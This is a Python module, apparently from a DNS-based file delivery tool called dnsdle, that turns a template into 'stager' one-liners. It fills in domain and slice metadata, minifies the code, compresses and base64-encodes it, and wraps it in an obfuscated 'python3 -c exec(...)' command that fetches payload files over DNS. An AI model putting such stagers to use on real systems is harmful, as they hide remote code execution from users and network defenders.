from __future__ import absolute_import, unicode_literals

import base64
import re
import zlib

from dnsdle.stager_minify import minify
from dnsdle.stager_template import build_stager_template
from dnsdle.state import StartupError


def render_stager(config, template, client_publish_item, payload_publish_item):
    """Render a Python stager one-liner for one payload file.

    template is the stager template source from build_stager_template().
    client_publish_item is the mapped publish item dict for the universal
    client script.  payload_publish_item is the mapped publish item dict
    for the user payload file.

    The returned internal render record is consumed by downloader_generator.
    """

    replacements = {
        # Client download params (universal client's own publish metadata)
        "DOMAIN_LABELS": tuple(config.domain_labels_by_domain[0]),
        "FILE_TAG": client_publish_item["file_tag"],
        "FILE_ID": client_publish_item["file_id"],
        "PUBLISH_VERSION": client_publish_item["publish_version"],
        "TOTAL_SLICES": int(client_publish_item["total_slices"]),
        "COMPRESSED_SIZE": int(client_publish_item["compressed_size"]),
        "PLAINTEXT_SHA256_HEX": client_publish_item["plaintext_sha256"],
        "MAPPING_SEED": config.mapping_seed,
        "SLICE_TOKEN_LEN": int(client_publish_item["slice_token_len"]),
        "RESPONSE_LABEL": config.response_label,
        "DNS_EDNS_SIZE": int(config.dns_edns_size),
        "DOMAINS_STR": ",".join(config.domains),
        "FILE_TAG_LEN": int(config.file_tag_len),
        # Payload params (per-file, passed to universal client via sys.argv)
        "PAYLOAD_PUBLISH_VERSION": payload_publish_item["publish_version"],
        "PAYLOAD_TOTAL_SLICES": int(payload_publish_item["total_slices"]),
        "PAYLOAD_COMPRESSED_SIZE": int(payload_publish_item["compressed_size"]),
        "PAYLOAD_SHA256": payload_publish_item["plaintext_sha256"],
        "PAYLOAD_TOKEN_LEN": int(payload_publish_item["slice_token_len"]),
    }

    source = template
    for key, value in replacements.items():
        source = source.replace("@@%s@@" % key, repr(value))

    unreplaced = re.search(r"@@[A-Z0-9_]+@@", source)
    if unreplaced:
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "unreplaced stager template placeholder",
            {"placeholder": unreplaced.group(0)},
        )

    minified = minify(source)

    try:
        compile(minified, "<stager>", "exec")
    except SyntaxError as exc:
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "minified stager source fails compilation: %s" % exc,
        )

    try:
        minified_bytes = minified.encode("ascii")
    except UnicodeEncodeError:
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "minified stager source is not ASCII",
        )
    compressed = zlib.compress(minified_bytes, 9)
    payload_str = base64.b64encode(compressed).decode("ascii")
    oneliner = (
        "python3 -c "
        '"import base64,zlib;'
        "exec(zlib.decompress(base64.b64decode('%s')))\" \"$@\""
        % payload_str
    )

    file_id = payload_publish_item["file_id"]
    if not re.match(r"^[0-9a-f]{16}$", file_id):
        raise StartupError(
            "startup",
            "stager_generation_failed",
            "payload file_id is invalid for artifact naming",
            {"file_id": file_id},
        )

    return {
        "language": "python",
        "kind": "stager",
        "source_filename": payload_publish_item["source_filename"],
        "filename": "dnsdle_%s.python.1-liner.txt" % file_id,
        "content": oneliner + "\n",
    }


def render_stagers(config, client_publish_item, payload_publish_items):
    """Render one Python stager per payload without writing files."""
    template = build_stager_template()
    return tuple(
        render_stager(config, template, client_publish_item, payload_item)
        for payload_item in payload_publish_items
    )
